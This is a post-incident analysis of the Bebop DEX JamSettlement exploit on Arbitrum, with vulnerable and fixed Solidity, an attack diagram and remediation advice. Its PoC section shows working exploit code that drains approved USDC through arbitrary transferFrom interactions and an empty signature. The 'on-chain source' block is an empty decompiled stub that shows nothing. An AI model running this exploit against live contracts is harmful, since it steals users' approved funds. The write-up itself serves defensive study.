# Bebop DEX — Arbitrary transferFrom Execution Vulnerability Analysis

| Field | Details |
|------|------|
| **Date** | 2025-08-07 |
| **Protocol** | Bebop DEX (JamSettlement) |
| **Chain** | Arbitrum |
| **Loss** | ~21,000 USD |
| **Attacker** | [0x59537353248d0b12c7fcca56a4e420ffec4abc91](https://arbiscan.io/address/0x59537353248d0b12c7fcca56a4e420ffec4abc91) |
| **Attack Tx** | [0xe5f8fe69](https://arbiscan.io/tx/0xe5f8fe69b38613a855dbcb499a2c4ecffe318c620a4c4117bd0e298213b7619d) |
| **Vulnerable Contract** | [0xbeb0b0623f66bE8cE162EbDfA2ec543A522F4ea6](https://arbiscan.io/address/0xbeb0b0623f66bE8cE162EbDfA2ec543A522F4ea6) |
| **Root Cause** | The `interactions` parameter of `JamSettlement.settle()` allows arbitrary `transferFrom` calls |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-08/Bebop_dex_exp.sol) |

---

## 1. Vulnerability Overview

The `JamSettlement` contract of Bebop DEX accepts an `interactions` array in its `settle()` function and uses it to call external contracts. Because these interactions are designed to allow calling arbitrary functions on arbitrary addresses, an attacker was able to pass an interaction encoding `USDC.transferFrom(victim, attacker, amount)` along with an empty signature, draining the USDC balances of any victim who had approved the contract.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable logic: interactions allow arbitrary external calls
contract JamSettlement {
    function settle(
        JamOrder calldata order,
        bytes calldata signature,
        JamInteraction[] calldata interactions,
        bytes memory hooksData,
        address balanceRecipient
    ) external payable {
        // Signature verification accepts empty signatures or can be bypassed
        _verifyOrder(order, signature);

        // interactions executed without validation
        for (uint256 i = 0; i < interactions.length; i++) {
            // ❌ No restrictions on the `to` address or `data` content
            (bool success,) = interactions[i].to.call{value: interactions[i].value}(
                interactions[i].data
            );
            if (!interactions[i].result) require(success);
        }
    }
}

// ✅ Fix: whitelist permitted calls within interactions
function settle(...) external payable {
    for (uint256 i = 0; i < interactions.length; i++) {
        // Block interactions that directly call transferFrom
        bytes4 selector = bytes4(interactions[i].data);
        require(selector != IERC20.transferFrom.selector, "transferFrom not allowed");
        require(isWhitelistedTarget[interactions[i].to], "Target not whitelisted");
        ...
    }
}
```

### On-Chain Source Code

Source: Sourcify verified

```solidity
// File: Bebop_decompiled.sol
contract Bebop {
    function transferNativeFromContract(address a, uint256 b) external {  // ❌ Vulnerability
        // TODO: decompiled logic not implemented
    }
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─1─▶ Construct JamSettlement.settle() call
  │         ├─ order: taker=attacker, empty sellTokens/buyTokens
  │         ├─ signature: empty bytes (bypass verification)
  │         └─ interactions:
  │               [0] USDC.transferFrom(victim1, attacker, 20,134,500,015)
  │               [1] USDC.transferFrom(victim2, attacker, 1,000,000)
  │
  ├─2─▶ JamSettlement: execute interactions in order
  │         └─ USDC.transferFrom called twice
  │         └─ Drain balances of all addresses that approved JamSettlement for USDC
  │
  └─3─▶ ~21,000 USD worth of USDC drained successfully
```

## 4. PoC Code (Core Logic + Comments)

```solidity
contract Bebop is BaseTestWithBalanceLog {
    function testExploit() public balanceLog {
        // Construct empty order (taker=attacker, no tokens)
        JamOrder memory order = JamOrder({
            taker: address(this),
            receiver: address(this),
            expiry: 1754987701,
            exclusivityDeadline: 0,
            nonce: 1,
            executor: address(this),
            partnerInfo: 0,
            sellTokens: new address[](0),  // no sell tokens
            buyTokens: new address[](0),   // no buy tokens
            sellAmounts: new uint256[](0),
            buyAmounts: new uint256[](0),
            usingPermit2: false
        });

        bytes memory signature = hex""; // empty signature — bypasses verification

        // Construct interaction to drain victim 1's USDC
        bytes memory interaction1Data = abi.encodeCall(
            IERC20.transferFrom,
            (victim1, address(this), 20_134_500_015) // ~20,134 USDC
        );

        // Construct interaction to drain victim 2's USDC
        bytes memory interaction2Data = abi.encodeCall(
            IERC20.transferFrom,
            (victim2, address(this), 1_000_000) // ~1 USDC
        );

        JamInteraction[] memory interactions = new JamInteraction[](2);
        interactions[0] = JamInteraction({result: false, to: usdc, value: 0, data: interaction1Data});
        interactions[1] = JamInteraction({result: false, to: usdc, value: 0, data: interaction2Data});

        // Call settle — interactions execute and drain USDC
        jamContract.settle(order, signature, interactions, hex"", address(this));
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Arbitrary External Call |
| **Attack Vector** | Arbitrary `transferFrom` execution via the `interactions` parameter |
| **Impact Scope** | All addresses that approved USDC to JamSettlement (~21,000 USD) |
| **CWE** | CWE-284 (Improper Access Control) |
| **DASP** | Access Control |

## 6. Remediation Recommendations

1. **Block direct `transferFrom` calls**: Prohibit use of the ERC20 `transferFrom` selector within interactions
2. **Whitelist permitted targets**: Restrict the `to` address in interactions to a pre-approved set of addresses
3. **Enforce strict signature validation**: Prevent `settle` from being called with an empty or invalid signature
4. **Minimize approval scope**: Guide users to approve only the exact amount required to JamSettlement, rather than unlimited approvals

## 7. Lessons Learned

- "Settlement contracts" are inherently designed to move tokens on behalf of users — allowing arbitrary execution of interactions or calldata exposes every approved token to risk.
- Accepting an empty signature renders signature verification meaningless — signature checks must be strictly enforced.
- The common practice of users granting unlimited approvals to DEX contracts maximizes damage when vulnerabilities like this are exploited.